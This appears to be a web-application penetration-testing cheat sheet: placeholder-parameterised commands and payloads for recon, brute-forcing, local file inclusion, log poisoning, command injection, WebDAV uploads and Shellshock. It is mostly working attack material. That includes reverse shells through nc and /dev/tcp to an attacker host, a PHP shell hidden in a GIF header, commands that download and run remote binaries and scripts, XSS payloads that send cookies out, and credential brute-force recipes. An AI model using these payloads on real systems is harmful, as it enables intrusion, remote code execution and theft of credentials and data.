`` Initial

    `` nikto

        `` Less defaults, less intense, no dictionary

            ~$ nikto -h http://VAR_TARGET_HOST -Plugins "outdated;shellshock;msgs;cookies;cgi;put_del_test;headers;multiple_index;httpoptions;ssl;robots;origin_reflection"

        `` All batteries included

            ~$ nikto -h http://VAR_TARGET_HOST
            ~$ nikto -h http://VAR_TARGET_HOST -useproxy http://VAR_PROXY_HOST:8881

    `` httpdumper

        ~$ httpdumper.py -c VAR_TARGET_CIDR -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -p 80/http 81/http 443/https 8000/http 8080/http 8443/https

        # Extended port list and read targets from file
        ~$ httpdumper.py -l VAR_TARGET_LIST -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -p 80/http 81/http 82/http 443/https 4443/https 1080/http 1443/https 8000/http 8008/http 8080/http 8081/http 8088/http 8888/http 9080/http 7443/https 8443/https 9443/https 10443/https 11443/https 12443/https

    `` nmap

        ~$ nmap VAR_TARGET_HOST -p 80 -v -sV --script "http-sitemap-gen*,http-methods,http-mobile*,http-open*,http-sql*,http-userdir*,http-vhosts,http-webdav*,http-iis*,http-enum*,http-frontpage*,http-useragent*"

`` Path Bruteforcing

    `` Slow and peaceful

        ~$ ffuf -w VAR_WORDLIST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -u https://VAR_TARGET_HOST/FUZZ -t 10 -p 1

    `` Match OK 200 only

        ~$ ffuf -w VAR_WORDLIST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -u https://VAR_TARGET_HOST/FUZZ -mc 200

    ``
        ~$ ffuf -w VAR_WORDLIST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -u https://VAR_TARGET_HOST/FUZZ -mc 204,301,302,307,401,403 -fs 2597 -fc 200 -t 15
        ~$ ffuf -w VAR_WORDLIST -u https://VAR_TARGET_HOST -H "Host: FUZZ" -fs VAR_INTEGER
        ~$ ffuf -w VAR_WORDLIST -u https://VAR_TARGET_HOST/script.php?FUZZ=test_value -fs VAR_INTEGER

`` LFI

    `` Automated

        ~$ dotdotpwn -m http-url -k "root:" -u "http://VAR_TARGET_HOST/?url=TRAVERSAL" -o unix -d 8 -f "/etc/passwd"
        ~$ dotdotpwn -m http-url -k "mci extensions" -u "http://VAR_TARGET_HOST/?url=TRAVERSAL" -o windows -d 8 -f "windows\win.ini"

    `` Basic

        ?file=../../../../../../../../../var/log/apache/error.log
        ?file=/etc/passwd/../../../../../../../../../../../../../../../../../..

    `` Path Truncation

        .php?filename=../../../etc/passwd/././././././././/././././././././././[...]

    `` Nullbyte Injection

        ?file=../../../../etc/passwd%00
        ?file=../../../../etc/passwd%00jpg

    `` Poisoning

        `` Headers

            .php?filename=../../../proc/self/environ
            User-Agent: <?=phpinfo(); ?>

            .php?filename[]= HTTP/1.1
            Referer: <?=phpinfo();?>

            .php?filename=../../../var/log/nginx/error_log

        `` SSH

            ~$ ssh <?=phpinfo();?>@VAR_ATTACKER_HOST
            .php?filename=../../../var/log/auth.log

        `` SMTP

            ~$ mail -s "<?=phpinfo();?>" www-data@VAR_ATTACKER_HOST < /dev/null
            .php?filename=../../../var/log/www-data

    `` curl

        ~$ curl 'http://VAR_TARGET_HOST/cgi-bin/admin.cgi' -i -s > before
        ~$ curl 'http://VAR_TARGET_HOST/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd' -i -s > after
        ~$ diff before after

`` Automated

    `` Generic

        ~$ wapiti -u http://VAR_TARGET_HOST/

        ~$ commix --url="http://VAR_TARGET_HOST/?url=INJECT_HERE"
        ~$ commix --url="http://VAR_TARGET_HOST/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=VAR_TARGET_HOST,ip_dst=VAR_TARGET_HOST"
        ~$ commix --url="http://VAR_TARGET_HOST/pingit.php" --data="ip=127.0.0.1E&submit=submit" --auth-url="http://VAR_TARGET_HOST/index.php" --auth-data="uname=admin&psw=%27+OR+1%3D1--+-&btnLogin=Login"
        ~$ commix --url="http://VAR_TARGET_HOST:8080/phptax/drawimage.php?pfilez=127.0.0.1&pdf=make" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --technique="f" --root-dir="/"
        ~$ commix --url="http://VAR_TARGET_HOST/cgi-bin/status/" --shellshock
        ~$ commix --url="http://VAR_TARGET_HOST/commix-testbed/scenarios/cookie/cookie(blind).php" --cookie="addr=127.0.0.1"
        ~$ commix --url="http://VAR_TARGET_HOST/commix-testbed/scenarios/user-agent/ua(blind).php" --level=3
        ~$ commix --url="http://VAR_TARGET_HOST/commix-testbed/scenarios/referer/referer(classic).php" --level=3
        ~$ commix --url="http://VAR_TARGET_HOST/do/cmd/*" --headers="X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF" --base64
        ~$ commix --url="http://VAR_TARGET_HOST/commix-testbed/scenarios/regular/POST/classic_json.php" --data='{"addr":"127.0.0.1","name":"ancst"}'
        ~$ commix --url="http://VAR_TARGET_HOST/cgi-bin/status" --shellshock --proxy="VAR_PROXY_HOST:3128"

    `` Wordpress

        ~$ wpscan --url VAR_TARGET_HOST -e vt,vp
        ~$ wpscan --url http://VAR_TARGET_HOST/ --wordlist VAR_WORDLIST --username VAR_USERNAME

    `` Joomla

        joomscan

    `` Fingerprinting

        ~$ python3 ./wig.py http://VAR_TARGET_HOST/

`` Ideas

    `` Bypassing auth with keep-alive

        ~$ printf 'GET / HTTP/1.1\r\nConnection: keep-alive\r\n\r\n' | ncat --ssl -v VAR_TARGET_HOST VAR_TARGET_PORT

    `` BusyBox chain

        ~$ curl -v --user 'VAR_USERNAME:VAR_PASSWORD' 'http://VAR_TARGET_HOST/command.cgi?ps|wget http://VAR_ATTACKER_HOST/tcpdump -P /tmp%26%26wget http://VAR_ATTACKER_HOST/busybox-mipsel -P /tmp%26%26chmod %2Bx /tmp/tcpdump%26%26chmod %2Bx /tmp/busybox-mipsel%26%26/tmp/tcpdump -n -i any udp -w -|/tmp/busybox-mipsel nc VAR_ATTACKER_HOST 10000'

    `` Node.js

        http://localhost:3000/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]

    `` Perl

        value='||eval `echo -e "YXdrIC...V2L251bGwK" | openssl enc -a -d`;#'

    `` PHP wrappers

        ~$ curl -s --data "<?system('ls -la');?>" "http://VAR_TARGET_HOST/script.php?path=php://input%00" | html2text
        .php?page=expect://ls
        .php?page=php://input&cmd=ls
        .php?page=php://filter/resource=/etc/passwd
        .php?page=php://filter/convert.base64-encode/resource=/etc/passwd
        .php?page=zip:///var/www/images/tmp.zip%23tmp
        .php?page=php://filter/read=zlib.deflate/read=convert.base64-encode/resource=
        .php?page=data://

        `` Python decompress

            >>> zlib.decompress(base64.b64decode(req), -15)

    `` IIS

        ~$ cadaver http://VAR_TARGET_HOST
        dav:/> put alter.asp alter.txt
        dav:/> copy alter.txt alter.asp;.txt

    `` RCE

        ~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=VAR_ATTACKER_HOST LPORT=80 -f elf > /var/www/html/index.html
        ~$ curl "http://VAR_TARGET_HOST/sync?opt=' w\get VAR_ATTACKER_HOST -P /tmp'
        ~$ curl "http://VAR_TARGET_HOST/sync?opt=' c\hmod +x /tmp/index.html'
        ~$ curl "http://VAR_TARGET_HOST/sync?opt=' /tmp/index.html'

    `` XHR

        var xhr = new XMLHttpRequest();
        xhr.open('TRACE', 'http://VAR_TARGET_HOST/', false);
        xhr.send(null);
        if(200 == xhr.status)
          alert(xhr.responseText);

    `` Cookies

        <img src="error.jpg" onerror="eval("new Image().src=\"http://VAR_TARGET_HOST:8000/\"+ document.cookie;")">

        <script>new Image().src="http://VAR_TARGET_HOST:8888/?o="+document.cookie;</script>

        >>> s = 'new Image().src=\"http://VAR_TARGET_HOST:8000/\"+ document.cookie;'
        >>> PAYLOAD = [ord(c) for c in s]
        <img src="error.jpg" onerror="eval(String.fromCharCode(PAYLOAD))">

        <script>new Image().src="http://VAR_TARGET_HOST/?o="+document.cookie;</script>

    `` Images

        `` GIF

            GIF98 <?php echo shell_exec("rm /tmp/.kernel;mkfifo /tmp/.kernel;cat /tmp/.kernel|/bin/sh -i 2>&1|nc VAR_ATTACKER_HOST 8000 >/tmp/.kernel"); ?>

        `` JPEG

            ~$ echo 'FFD8FFDB' | xxd -r -p > test.jpg
            ~$ echo '<?php phpinfo(); ?>' >> test.jpg

`` Paths

    - /var/log/apache/access.log
    - /var/log/apache/error.log
    - /var/log/apache2/access.log
    - /var/log/apache2/error.log
    - /var/log/auth.log
    - /var/log/cron.log
    - /var/log/httpd/access_log
    - /var/log/httpd/error_log
    - /var/log/messages
    - /var/log/secure
    - /var/www/config.php
    - /var/www/configuration.php
    - /var/www/configuration.php
    - /var/www/html/inc/header.inc.php
    - /var/www/html/sites/default/settings.php
    - /var/www/html/wp-config.php

`` Shellshock

    `` Tools

        ~$ nmap VAR_TARGET_HOST -p VAR_TARGET_PORT --script http-shellshock --script-args uri=/cgi-bin/test.cgi
        ~$ wfuzz -H "User-Agent: () { :;}; echo; echo vulnerable" --ss vulnerable -w VAR_WORDLIST http://VAR_TARGET_HOST/FUZZ

    `` Test

        GET /cgi-bin/script.cgi HTTP/1.1
        () { :;}; echo; echo "VAR_STRING_1": () { :;}; echo; echo "VAR_STRING_2"
        Host: VAR_TARGET_HOST
        Connection: close
        Cookie: () { :;}; echo; echo "VAR_STRING_3"
        User-Agent: () { :;}; echo; echo "VAR_STRING_4"
        Referer: () { :;}; echo; echo "VAR_STRING_5"

    `` Samples

        Referer: () { :;}; echo "XXX"; /bin/bash -c "exec /bin/sh 0</dev/tcp/VAR_TARGET_HOST/443 1>&0 2>&0 &"
        x: () { :;}; /sbin/ifconfig > /tmp/ifconfig.txt
        x: () { :;}; echo "Hacked" > /var/www/hacked.html
        env ENV_VAR_FN=’() { <your function> }; <attacker code here>’
        User-agent: () { :;}; echo something>/var/www/html/new_file
        () { :;}; /bin/bash -c \"whoami | mail -s 'VAR_TARGET_HOST l' xxxxxxxxxxxxxxxx@gmail.com
        () {:;}; ping -c 1 -p VAR_HEX VAR_ATTACKER_HOST
        () {:;}; /usr/bin/wget http://VAR_ATTACKER_HOST/VAR_HEX >> `null
        () { :;}; /bin/bash -c \"cd /tmp;wget http://VAR_TARGET_HOST/ji;curl -O /tmp/ji http://VAR_TARGET_HOST/ji ; perl /tmp/ji;rm -rf /tmp/ji\"
        () { :;}; /bin/bash -c \"/usr/bin/env curl -s http://VAR_TARGET_HOST/cl.py > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update\"
        Whatever-Here: () { :;}; echo "XXX"; /bin/bash -c "exec /bin/sh 0</dev/tcp/VAR_TARGET_HOST/VAR_TARGET_PORT 1>&0 2>&0 &"

`` curl

    ~$ curl -v -X TRACE VAR_TARGET_HOST
    ~$ curl --user 'VAR_USERNAME:VAR_PASSWORD' 'https://VAR_TARGET_HOST'
    ~$ curl --verbose --header 'Host: VAR_TARGET_HOST' 'http://VAR_TARGET_HOST/'
    ~$ curl -v -X OPTIONS http://VAR_TARGET_HOST
    ~$ curl VAR_TARGET_HOST -s -L | html2text -width '99' | uniq
    ~$ curl -X POST -H "Content-Type: application/json" -d @data.json http://VAR_TARGET_HOST/script.php
    ~$ curl -X POST -H "Content-Type: application/json" -d 'VAR_STRING' http://VAR_TARGET_HOST/script.php
    ~$ curl "http://VAR_TARGET_HOST/sync?opt=' /usr/bin/whi[c]h mk\nod'"
    ~$ curl "http://VAR_TARGET_HOST/sync?opt=' p\s aux'"
    ~$ curl "http://VAR_TARGET_HOST/sync?opt=' c\at /usr/local/ope\nresty/nginx/conf/nginx.conf'" > nginx.conf
    ~$ curl -s VAR_TARGET_HOST/users/{1..20}.json

`` WebDAV

    `` Tools

        ~$ davtest -url http://VAR_TARGET_HOST

    `` curl

        ~$ curl -v -X PUT -d @test.txt http://VAR_TARGET_HOST/test.txt
        ~$ curl -v -X PUT -d '<% out.println("hello");%>' http://VAR_TARGET_HOST/test.jsp
        ~$ curl -v -X MOVE --header 'Destination:http://VAR_TARGET_HOST/new.txt' 'http://VAR_TARGET_HOST/old.txt'
        ~$ curl -v -X DELETE http://VAR_TARGET_HOST:8585/uploads/verify.txt
        ~$ curl -X MKCOL 'https://VAR_TARGET_HOST/new_folder'
        ~$ curl -u VAR_USERNAME:VAR_PASSWORD -X MKCOL 'http://VAR_TARGET_HOST/webdav/test/'

`` Password Bruteforcing

    `` POST

        ~$ hydra VAR_TARGET_HOST http-post-form -t 2 -w 30 -f -L usernames.txt -P passwords.txt "/admin_loginok.html:username=^USER^&password=^PASS^&username_val=^USER^&password_val=^PASS^&submit_btn=+Login+:Login failed"
        ~$ patator http_fuzz url=http://VAR_TARGET_HOST/phpmyadmin/index.php --threads 10 method=POST follow=1 accept_cookie=1 body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=VAR_WORDLIST -x ignore:fgrep='Cannot log in to the MySQL server'
        ~$ ffuf -w VAR_WORDLIST -X POST -d "username=admin\&password=FUZZ" -u https://VAR_TARGET_HOST/script.php -fc 401

    `` Basic Auth + Proxy

        ~$ patator http_fuzz url=http://VAR_TARGET_HOST/ proxy_type=http proxy=127.0.0.1:8881 0=VAR_WORDLIST user_pass=VAR_USERNAME:FILE0 -x ignore:code=401

    `` GET with cookie

        ~$ hydra VAR_TARGET_HOST http-get-form -t 2 -l VAR_USERNAME -P VAR_WORDLIST "/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low;PHPSESSID=VAR_STRING"

    `` Non-standard port

        ~$ hydra VAR_TARGET_HOST http-post-form -I -d -V -t 1 -w 80 -c 1 -W 3 -s 5466 -f -L usernames.txt -e nsr "/admin_loginok.html:username=^USER^&password=^PASS^&username_val=^USER^&password_val=^PASS^&submit_btn=+Login+:failed:H=User-Agent\: Mozilla/5.0 (X11; Linux x86_64; rv\:52.0) Gecko/20100101 Firefox/52.0:C="

    `` Proxied

        ~$ env HYDRA_PROXY_HTTP=http://localhost:8080 hydra VAR_TARGET_HOST http-post-form -t 2 -s 5466 -f -L usernames.txt -P passwords.txt "/admin_loginok.html:username=^USER^&password=^PASS^&username_val=^USER^&password_val=^PASS^&submit_btn=+Login+:Login failed"

        ~$ proxychains4 -q curl -sv --cookie "username=VAR_USERNAME; password=VAR_PASSWORD" --data "user=%00<?system('ls -la'); die();?>" "http://VAR_TARGET_HOST/script.php" | html2text

    `` Wordpress

        ~$ hydra VAR_TARGET_HOST -V http-form-post -L usernames.txt -P passwords.txt '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

    `` Tomcat

        ~$ python ./tomcat-check.py

`` WebRTC local IP discovery

    `` Simplified

        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
        pc.createDataChannel("");
        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
        pc.onicecandidate = function(ice){
            if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
            var localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
            console.log('Local IP: ', localIp);
            pc.onicecandidate = noop;
        };

    `` Over STUN request

        [ Source: https://github.com/diafygi/webrtc-ips ]

        // <iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        // <script>getIPs(function(ip){console.log(ip);});

        function getIPs(callback){
            var ip_dups = {};
            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            var useWebKit = !!window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                var win = iframe.contentWindow;
                RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
                useWebKit = !!win.webkitRTCPeerConnection;
            }
            var mediaConstraints = {
                optional: [{RtpDataChannels: true}]
            };
            var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
            var pc = new RTCPeerConnection(servers, mediaConstraints);
            function handleCandidate(candidate){
                var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
                var ip_addr = ip_regex.exec(candidate)[1];
                if(ip_dups[ip_addr] === undefined)
                    callback(ip_addr);
                ip_dups[ip_addr] = true;
            }
            pc.onicecandidate = function(ice){
                if(ice.candidate)
                    handleCandidate(ice.candidate.candidate);
            };
            pc.createDataChannel("");
            pc.createOffer(function(result){
                pc.setLocalDescription(result, function(){}, function(){});
            }, function(){});
            setTimeout(function(){
                var lines = pc.localDescription.sdp.split('\n');
                lines.forEach(function(line){
                    if(line.indexOf('a=candidate:') === 0)
                        handleCandidate(line);
                });
            }, 1000);
        }

`` Popular MIME Types

    - application/excel
    - application/javascript
    - application/msword
    - application/octet-stream
    - application/pdf
    - application/powerpoint
    - application/vnd.ms-excel
    - application/vnd.ms-powerpoint
    - image/bmp
    - image/gif
    - image/jpeg
    - image/png
    - text/javascript
    - text/plain
